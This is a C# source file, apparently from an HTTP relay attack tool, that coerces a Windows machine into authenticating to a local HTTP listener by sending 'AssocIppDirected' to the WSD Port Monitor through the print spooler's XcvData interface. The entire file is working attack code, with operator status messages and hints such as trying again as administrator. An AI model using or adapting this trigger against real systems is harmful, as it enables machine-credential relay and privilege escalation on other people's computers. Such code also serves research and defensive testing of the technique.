using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Httprelayserver.AuthTrigger
{
    public static class IppCoerceTrigger
    {
        [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool OpenPrinterW(string pPrinterName, out IntPtr phPrinter, ref PRINTER_DEFAULTS pDefault);

        [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool XcvDataW(IntPtr hXcv, string pszDataName, IntPtr pInputData, uint cbInputData, IntPtr pOutputData, uint cbOutputData, out uint pcbOutputNeeded, out uint pdwStatus);

        [DllImport("winspool.drv", SetLastError = true)]
        static extern bool ClosePrinter(IntPtr hPrinter);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct PRINTER_DEFAULTS
        {
            public IntPtr pDatatype;
            public IntPtr pDevMode;
            public uint DesiredAccess;
        }

        const uint SERVER_ACCESS_ADMINISTER = 0x01;

        public static bool Trigger(int port)
        {
            Console.WriteLine("[+] Coercing machine authentication via IppCoerce (WSD Port Monitor)");

            var defaults = new PRINTER_DEFAULTS
            {
                pDatatype = IntPtr.Zero,
                pDevMode = IntPtr.Zero,
                DesiredAccess = SERVER_ACCESS_ADMINISTER
            };

            if (!OpenPrinterW(",XcvMonitor WSD Port", out IntPtr hPrinter, ref defaults))
            {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] OpenPrinter for XcvMonitor WSD Port failed: error {err} (0x{err:x})");

                if (err == 1801)
                    Console.WriteLine("[-] The printer name is invalid - WSD Port Monitor may not be available");
                else if (err == 5)
                    Console.WriteLine("[-] Access denied - try running as administrator");

                return false;
            }

            Console.WriteLine("[+] XcvMonitor WSD Port handle opened");

            string ippUri = $"ipp://localhost:{port}/ipp/print\0";
            byte[] uriBytes = Encoding.Unicode.GetBytes(ippUri);

            IntPtr inputBuf = Marshal.AllocHGlobal(uriBytes.Length);
            Marshal.Copy(uriBytes, 0, inputBuf, uriBytes.Length);

            IntPtr outputBuf = Marshal.AllocHGlobal(1024);

            try
            {
                Console.WriteLine($"[*] Sending AssocIppDirected -> ipp://localhost:{port}/ipp/print");

                bool result = XcvDataW(
                    hPrinter,
                    "AssocIppDirected",
                    inputBuf,
                    (uint)uriBytes.Length,
                    outputBuf,
                    1024,
                    out uint bytesNeeded,
                    out uint pdwStatus
                );

                Console.WriteLine($"[*] XcvData returned: result={result} pdwStatus={pdwStatus} (0x{pdwStatus:x})");

                if (pdwStatus == 0)
                    Console.WriteLine("[+] AssocIppDirected succeeded - HTTP auth should be inbound");
                else if (pdwStatus == 3012)
                    Console.WriteLine("[+] WSD_E_DEVICE_NOT_FOUND (3012) - HTTP auth may still be inbound");
                else
                    Console.WriteLine($"[-] Unexpected pdwStatus: {pdwStatus}");

                return true;
            }
            finally
            {
                Marshal.FreeHGlobal(inputBuf);
                Marshal.FreeHGlobal(outputBuf);
                ClosePrinter(hPrinter);
            }
        }

        public static async Task<bool> TriggerAsync(int httpPort, int delayMs = 2000)
        {
            return await Task.Run(() =>
            {
                if (delayMs > 0)
                {
                    Console.WriteLine($"[*] Waiting {delayMs}ms for HTTP server to start...");
                    Thread.Sleep(delayMs);
                }
                return Trigger(httpPort);
            });
        }
    }
}
